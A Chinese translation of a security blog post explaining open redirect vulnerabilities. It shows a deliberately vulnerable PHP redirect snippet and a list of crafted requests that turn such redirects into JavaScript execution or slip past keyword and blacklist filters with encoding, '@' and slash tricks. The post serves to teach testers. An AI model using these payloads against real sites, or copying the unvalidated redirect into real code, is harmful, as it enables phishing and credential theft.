# CVV #2:开放重定向

> 原文：<https://infosecwriteups.com/cvv-2-open-redirect-213555765607?source=collection_archive---------6----------------------->

这是一个关于“常见漏洞载体”和相关利用方法的简短系列。

![](img/940f8de98ff5838c96c118162cf57d11.png)

低垂的水果更容易采集

如果你没有读过我关于本地文件包含的第一篇文章(CVV #1)，那就来吧！今天是关于**开放重定向**(简称:“OR”)。

根据 [OWASP-Project](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet) 的说法，开放重定向是一种漏洞，定义如下:

> *[…]当 web 应用程序接受不可信的输入，这可能导致 web 应用程序将请求重定向到不可信输入中包含的 URL。通过修改恶意网站的不可信 URL 输入，攻击者可以成功发起网络钓鱼诈骗并窃取用户凭据[…]*

让我们看一个用 PHP 编写的 web 应用程序的简单例子，它容易受到“或”的攻击:

```
<?php 
   header('Location: ' . $_GET['url']);
   die(); // this is sometimes missing which can leads to an authentication bypass
?>
```

提交以下 HTTP 请求后:

```
GET vulnerable.php?url=https://si9int.sh HTTP/1.1
Host: victim.com
```

我们应该得到一个服务器端重定向(HTTP 301HTTP 307)到通过*URL*-参数定义的 URL。

以下内容描述了基于我目前知识的方法，这些方法在利用“或”问题时可能有用，例如扩展到[跨站点脚本](https://en.wikipedia.org/wiki/Cross-site_scripting)。

感谢: *bobrov、filedescriptor、cujanovic、security diots*为本主题贡献他们的知识。

**[1]执行 JavaScript**

得益于 *javascript-URI* 和*数据-URI* 包装器，利用“或”漏洞执行 JS 是可能的。这可以通过重定向到指定的包装器来实现(注意，只有当应用程序通过将锚标签注入到当前的 [DOM](https://en.wikipedia.org/wiki/Document_Object_Model) 来重定向客户端时，这才有效)。

```
GET vulnerable.php?url=javascript:alert(1) HTTP/1.1
Host: victim.com
---
GET vulnerable.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4NCg== HTTP/1.1
Host: victim.com
```

**[2]绕过关键词过滤**

如果一个域过滤一个特定的关键字(主要是域名本身)，可以通过使用关键字作为注入域(子域或第*n*-lvl-domain)的一部分来绕过它。

```
GET vulnerable.php?url=victim.com.attacker.com HTTP/1.1
Host: victim.com
```

使用“@”符号也可以成功利用漏洞。浏览器会将所有在 *AT_SIGN* 之后的内容重定向到指定的域(这要感谢大多数现代浏览器中包含的登录 URI 模式；[试试看](http://user@si9int.sh)。

```
GET vulnerable.php?url=victim.com@attacker.com HTTP/1.1
Host: victim.com
```

第三种方法是在您自己的服务器上创建一个名为 vulnerable domain 的文件夹，并将其用作有效负载，希望易受攻击的脚本会忽略 URL 的第一个/*n*部分。

```
GET vulnerable.php?url=attacker.com/victim.com HTTP/1.1
Host: victim.com
```

当应用程序需要特定的路径内扩展时，这也很有用。在这种情况下，我们可以创建一个名为所需扩展名的文件夹，并将其传递给 vulnerable 参数。

```
GET vulnerable.php?url=attacker.com/.jpg HTTP/1.1
Host: victim.com
```

**【3】绕过黑名单关键词**

可能有些应用程序已经过滤了某些关键字的易受攻击参数，因此如果某些黑名单中的关键字被设置为 value，则不会进行重定向。以下是如何绕过这些关键词的列表:

*   **a.)** 通过使用黑名单中的字符/关键字的双 URL 或三 URL 编码版本，可以绕过大多数过滤器
*   **b.)** 点例如`victim.com`，旁路:`https://attacker%E3%80%82com`，(.URL 编码)，一个[中文分隔符](https://en.wiktionary.org/wiki/%E3%80%82)哪个浏览器处理的方式和点一样
*   **c.)** HTTP-或 HTTPS-关键字例如`https://victim.com`，bypass: `//attacker.com`，两个斜线足以让浏览器识别 HTTP/HTTPS 协议的使用
*   **d.)** 斜线如`https://victim.com`，旁路:`https:attacker.com`，现代浏览器的自动纠错导致了这种行为
*   **e.)** 斜线和 HTTP/HTTPS-关键词，绕过:`\/\/attacker.com`，原因同上

我希望你学到了一些新东西。如果您发现任何内容相关或语法错误或有任何补充，请写下评论。